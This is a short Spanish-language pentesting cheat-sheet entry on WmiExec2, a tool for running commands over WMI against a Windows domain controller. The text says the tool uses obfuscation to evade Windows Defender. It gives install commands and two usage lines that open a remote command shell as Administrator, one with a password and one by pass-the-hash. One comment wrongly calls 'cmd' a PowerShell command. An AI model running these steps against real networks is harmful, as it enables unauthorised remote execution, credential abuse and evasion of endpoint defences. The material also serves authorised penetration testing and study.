## Bypassing PowerShell Security 

Tags: #AD #Bypass #AD #WmiExec2 

## WmiExec2

E**jecutar comandos mediante WMI (Windows Management Instrumentation)** en lugar de usar el método de ejecución habitual de PowerShell. Eso utiliza ofuscación para evadir Windows Defender. 

* [WmiExec2](https://github.com/ice-wzl/wmiexec2)

```bash 
# Descargar 
❯ git clone https://github.com/ice-wzl/wmiexec2.git
❯ cd wmiexec2/

# Instalar 
❯ python3 -m venv .venv
❯ source .venv/bin/activate
❯ pip3 install -r requirements.txt
```

```powershell 
❯ python3 wmiexec2.py Domain.corp/Administrator:'P@$$w0rd123!'@IP_DC --shell-type cmd

	# cmd = Es un comando de Powershell 
	
❯ python3 wmiexec2.py Domain.corp/Administrator@IP_DC -hashes ':NT'
```